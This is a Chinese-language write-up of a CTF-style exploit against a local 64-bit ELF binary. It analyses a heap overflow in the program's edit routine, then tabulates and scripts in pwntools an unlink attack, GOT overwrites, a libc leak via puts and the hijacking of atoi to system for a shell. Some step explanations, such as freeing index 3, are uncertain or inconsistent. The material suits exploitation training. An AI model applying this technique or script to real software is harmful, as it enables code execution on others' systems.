# 漏洞利用文档

## 执行环境
基于exp脚本和程序分析，总结执行环境如下：
- **程序类型**：64位ELF二进制程序，动态链接（使用`ldd`可查看libc依赖）
- **保护机制**：通过`checksec`分析，推测以下状态：
  - No PIE：全局地址固定（如`g_pointer=0x602140`），便于利用
  - Partial RELRO：GOT表可写，允许劫持
  - Stack Canary：可能开启，但堆利用不直接影响栈
  - NX：可能开启，但通过GOT覆盖执行system
- **依赖需求**：需要libc库（exp中通过`elf.libc`自动获取）
- **运行环境**：Linux系统，使用pwntools进行漏洞利用，终端支持tmux分屏调试

## 漏洞成因
### 关键结构体
- **全局指针数组** `::s`（地址`0x602140`）：存储所有分配的内存块指针，最大索引由`dword_602100`控制
- **堆块结构**：标准glibc堆管理，包含chunk头（size、prev_size）和用户数据区

### 漏洞分析
- **漏洞位置**：`sub_4009E8`函数（选项2的写入功能）
- **漏洞类型**：堆溢出（Heap Overflow）
- **根本原因**：
  - 写入操作允许用户指定任意长度`n`，但未检查是否超出实际分配大小
  - 循环`fread`无条件写入，直到达到用户指定的`n`字节
  - 攻击者可分配小内存块后指定大`n`值，溢出覆盖相邻堆块管理数据
- **利用后果**：覆盖chunk头（size、prev_size）、伪造fake chunk、触发unlink操作，最终实现任意地址写入和代码执行

## 漏洞利用过程
以下表格描述了exp执行过程中关键步骤的堆内存变化：

| 步骤 | 操作 | 内存变化描述 | 关键地址/值变化 |
|------|------|-------------|------------------|
| 1 | `alloc(0x100); alloc(0x30); alloc(0x80)` | 分配三个堆块：块0(0x100)、块1(0x30)、块2(0x80)；块1与块2相邻，为溢出做准备 | 全局数组`0x602140`存储指针：[块0_ptr, 块1_ptr, 块2_ptr] |
| 2 | `edit(2, len(payload), payload)` | 通过编辑块2触发溢出，覆盖块1用户区及块2chunk头；构造fake chunk：fd=`0x602138`, bk=`0x602140`, size=`0x20` | 块2 size从`0x91`变为`0x90`（清除PREV_INUSE位）；prev_size保持`0x30` |
| 3 | `free(3)` | 释放块2（索引3可能为程序内部映射），触发unlink：因PREV_INUSE=0，glibc合并fake chunk与块2，执行unlink操作 | 全局数组修改：`*(0x602140) = 0x602138`, `*(0x602138) = 0x602140` |
| 4 | `edit(2, len(payload2), payload2)` | 利用修改后的全局指针，写入GOT表地址：覆盖为free@got、puts@got、atoi@got | 全局数组指向GOT表，实现任意地址读写基址 |
| 5 | `edit(0, len(payload3), payload3)` | 覆盖free@got为puts@plt，将free调用转为puts调用 | GOT表：free@got → puts@plt |
| 6 | `free(1)` | 调用free(1)（实际执行puts），泄露libc中puts地址；计算libc基址和system地址 | 泄露地址：puts_addr → libc_addr = puts_addr - libc.sym['puts'] |
| 7 | `edit(2, len(payload4), payload4)` | 覆盖atoi@got为system地址，劫持输入处理函数 | GOT表：atoi@got → system |
| 8 | `p.interactive()` | 启动交互shell，程序被替换为`/bin/dash`，完成利用 | 进程内存重置，获得shell控制权 |

**内存布局关键点**：
- 初始堆相邻性：块1结束地址与块2开始地址紧密相邻（如`0x3b668570`），使溢出可直接覆盖块2头
- Unlink机制：利用glibc的unlink安全检查（fd->bk == bk->fd），修改全局指针
- GOT劫持链：通过全局指针重定向，逐步覆盖GOT表条目，最终执行system("/bin/dash")

## Exploit
以下为带详细注释的漏洞利用脚本：

```python
from pwn import *

# 设置调试环境
context.log_level = 'debug'  # 开启调试输出
context.terminal = ['tmux', 'splitw', '-h']  # 支持tmux分屏
p = process('./data/sample0')  # 启动目标程序
elf = ELF('./data/sample0')   # 加载ELF信息
libc = elf.libc               # 获取libc引用
g_pointer = 0x602140          # 全局数组地址

# 功能封装函数
def alloc(size:int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    return p.recv()

def edit(idx:int, size:bytes, content:str):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    if type(content)==str:
        p.sendline(content.encode())
    elif type(content)==bytes:
        p.sendline(content)
    return p.recv()

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    return p.recv()

def show(idx):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    return p.recv()

# Step 1: 布置堆内存布局 - 分配三个块，块1(0x30)和块2(0x80)相邻为溢出创造条件
alloc(0x100)
alloc(0x30)
alloc(0x80)

# Step 2: 构造fake chunk并触发堆溢出
# payload结构: [填充] + fake_chunk_header + 覆盖块2头
# fake_chunk: prev_size=0, size=0x20, fd=0x602138, bk=0x602140
# 覆盖块2: prev_size=0x30, size=0x90 (清除PREV_INUSE位)
payload = p64(0) + p64(0x20) + p64(g_pointer+16-0x18) + p64(g_pointer+16-0x10) + p64(0x20) + b'a'*8 + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)  # 通过编辑块2溢出覆盖块1和块2

# Step 3: 触发unlink攻击 - 释放块2时因PREV_INUSE=0而合并fake chunk
free(3)  # 注意：索引3可能对应程序内部块2，触发unlink修改全局指针

# Step 4: 利用unlink后的全局指针劫持GOT表
# 写入GOT表地址到全局数组，建立任意读写原语
payload2 = b'b'*8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
edit(2, len(payload2), payload2)

# Step 5: 覆盖free@got为puts@plt - 将free调用转为puts用于泄露地址
payload3 = p64(elf.plt['puts'])
edit(0, len(payload3), payload3)

# Step 6: 泄露libc地址 - 调用free(1)实际执行puts，泄露puts地址后计算libc基址
ret = '0x' + free(1)[:6][::-1].hex()  # 提取泄露的地址并转换格式
puts_addr = int(ret, 16)
libc_addr = puts_addr - libc.sym['puts']  # 计算libc基址
system_addr = libc_addr + libc.sym['system']  # 计算system地址

# Step 7: 覆盖atoi@got为system地址 - 劫持输入处理函数
payload4 = p64(system_addr)
edit(2, len(payload4), payload4)

# Step 8: 获取shell - 此时atoi被替换为system，输入命令执行
p.interactive()
```

**关键利用技术注释**：
- **堆布局**：通过精确控制块大小确保内存相邻，为溢出提供条件
- **Fake Chunk**：构造符合unlink检查的chunk结构（fd->bk == P && bk->fd == P）
- **GOT劫持**：利用任意写入逐步覆盖GOT，避免直接执行shellcode
- **地址泄露**：通过puts泄露libc地址，绕过ASLR保护
- **系统调用**：最终通过system("/bin/dash")获得完整shell权限
